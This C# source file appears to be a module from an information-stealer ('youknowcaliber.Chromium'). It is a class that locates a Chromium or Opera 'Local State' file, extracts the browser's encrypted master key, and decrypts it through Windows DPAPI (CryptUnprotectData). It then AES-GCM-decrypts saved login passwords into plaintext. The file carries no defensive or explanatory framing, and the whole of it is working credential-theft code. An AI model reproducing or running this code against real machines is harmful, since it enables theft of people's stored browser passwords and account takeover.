﻿using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace youknowcaliber.Chromium
{
	internal sealed class Crypto
	{
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Crypto.DataBlob pCipherText, ref string pszDescription, ref Crypto.DataBlob pEntropy, IntPtr pReserved, ref Crypto.CryptprotectPromptstruct pPrompt, int dwFlags, ref Crypto.DataBlob pPlainText);

		public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
		{
			Crypto.DataBlob dataBlob = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob2 = default(Crypto.DataBlob);
			Crypto.DataBlob dataBlob3 = default(Crypto.DataBlob);
			Crypto.CryptprotectPromptstruct cryptprotectPromptstruct = new Crypto.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Crypto.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					bool flag = bCipher == null;
					if (flag)
					{
						bCipher = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(bCipher.Length);
					dataBlob2.cbData = bCipher.Length;
					Marshal.Copy(bCipher, 0, dataBlob2.pbData, bCipher.Length);
				}
				catch
				{
				}
				try
				{
					bool flag2 = bEntropy == null;
					if (flag2)
					{
						bEntropy = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(bEntropy.Length);
					dataBlob3.cbData = bEntropy.Length;
					Marshal.Copy(bEntropy, 0, dataBlob3.pbData, bEntropy.Length);
				}
				catch
				{
				}
				Crypto.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				bool flag3 = dataBlob.pbData != IntPtr.Zero;
				if (flag3)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				bool flag4 = dataBlob2.pbData != IntPtr.Zero;
				if (flag4)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				bool flag5 = dataBlob3.pbData != IntPtr.Zero;
				if (flag5)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		public static byte[] GetMasterKey(string sLocalStateFolder)
		{
			bool flag = sLocalStateFolder.Contains("Opera");
			string text;
			if (flag)
			{
				text = sLocalStateFolder + "\\Opera Stable\\Local State";
			}
			else
			{
				text = sLocalStateFolder + "\\Local State";
			}
			byte[] array = new byte[0];
			bool flag2 = !File.Exists(text);
			byte[] result;
			if (flag2)
			{
				result = null;
			}
			else
			{
				bool flag3 = text != Crypto.sPrevBrowserPath;
				if (flag3)
				{
					Crypto.sPrevBrowserPath = text;
					MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text));
					foreach (object obj in matchCollection)
					{
						Match match = (Match)obj;
						bool success = match.Success;
						if (success)
						{
							array = Convert.FromBase64String(match.Groups[1].Value);
						}
					}
					byte[] array2 = new byte[array.Length - 5];
					Array.Copy(array, 5, array2, 0, array.Length - 5);
					try
					{
						Crypto.sPrevMasterKey = Crypto.DPAPIDecrypt(array2, null);
						result = Crypto.sPrevMasterKey;
					}
					catch
					{
						result = null;
					}
				}
				else
				{
					result = Crypto.sPrevMasterKey;
				}
			}
			return result;
		}

		public static string GetUTF8(string sNonUtf8)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = sNonUtf8;
			}
			return result;
		}

		public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
		{
			byte[] array = new byte[12];
			Array.Copy(bEncryptedData, 3, array, 0, 12);
			byte[] result;
			try
			{
				byte[] array2 = new byte[bEncryptedData.Length - 15];
				Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
				byte[] array3 = new byte[16];
				byte[] array4 = new byte[array2.Length - array3.Length];
				Array.Copy(array2, array2.Length - 16, array3, 0, 16);
				Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
				cAesGcm cAesGcm = new cAesGcm();
				result = cAesGcm.Decrypt(bMasterKey, array, null, array4, array3);
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = null;
			}
			return result;
		}

		public static string EasyDecrypt(string sLoginData, string sPassword)
		{
			bool flag = sPassword.StartsWith("v10") || sPassword.StartsWith("v11");
			string @string;
			if (flag)
			{
				byte[] masterKey = Crypto.GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
				@string = Encoding.Default.GetString(Crypto.DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
			}
			else
			{
				@string = Encoding.Default.GetString(Crypto.DPAPIDecrypt(Encoding.Default.GetBytes(sPassword), null));
			}
			return @string;
		}

		public static string BrowserPathToAppName(string sLoginData)
		{
			bool flag = sLoginData.Contains("Opera");
			string result;
			if (flag)
			{
				result = "Opera";
			}
			else
			{
				sLoginData.Replace(Paths.lappdata, "");
				result = sLoginData.Split(new char[]
				{
					'\\'
				})[1];
			}
			return result;
		}

		private static string sPrevBrowserPath = "";

		private static byte[] sPrevMasterKey = new byte[0];

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			public int cbSize;

			public int dwPromptFlags;

			public IntPtr hwndApp;

			public string szPrompt;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			public int cbData;

			public IntPtr pbData;
		}
	}
}
